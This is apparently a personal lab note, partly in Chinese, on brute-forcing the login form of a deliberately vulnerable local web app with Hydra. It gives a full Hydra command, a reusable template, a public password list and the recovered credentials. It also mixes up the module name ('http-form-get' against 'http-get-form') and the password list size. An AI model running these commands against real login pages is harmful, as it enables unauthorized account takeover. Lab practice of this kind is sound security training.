# Brute force

## 觀察

觀察 URL parameters

```
http://localhost:8086/vulnerabilities/brute/?username=admin&password=123&Login=Login#
```

### 紀錄錯誤回應訊息

```
Username and/or password incorrect.
```

## 使用 Hydra 測試密碼

### Target URL
```
http://localhost:8086/vulnerabilities/brute/?username=qwe&password=123&Login=Login#
```
## Hydra options

### module: http-form-get

可以用 `hydra -U http-get-form` 閱讀一下 module 用法

```
hydra -U http-get-form
```

### http-form-get module syntax

```
Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

### path

```
/vulnerabilities/brute/?
```

### GET/POST 變數用 `^` 包住

```
:username=^USER^&password=^PASS^&Login=Login
```

### error message

```
:F=Username and/or password incorrect.
```

## brute force

### password lists

借用別人的 password list

SecLists/10-million-password-list-top-100.txt at master · danielmiessler/SecLists
[https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt)

```
hydra -V -l admin -P 10-million-password-list-top-10000.txt -s 8086 -f localhost http-form-get "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
```

## Hydra snippets

```
hydra -V -l <user> -P <password file> -s <port> -f <host> <module> "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
```

## Done 
```
帳號: admin
密碼: password
```
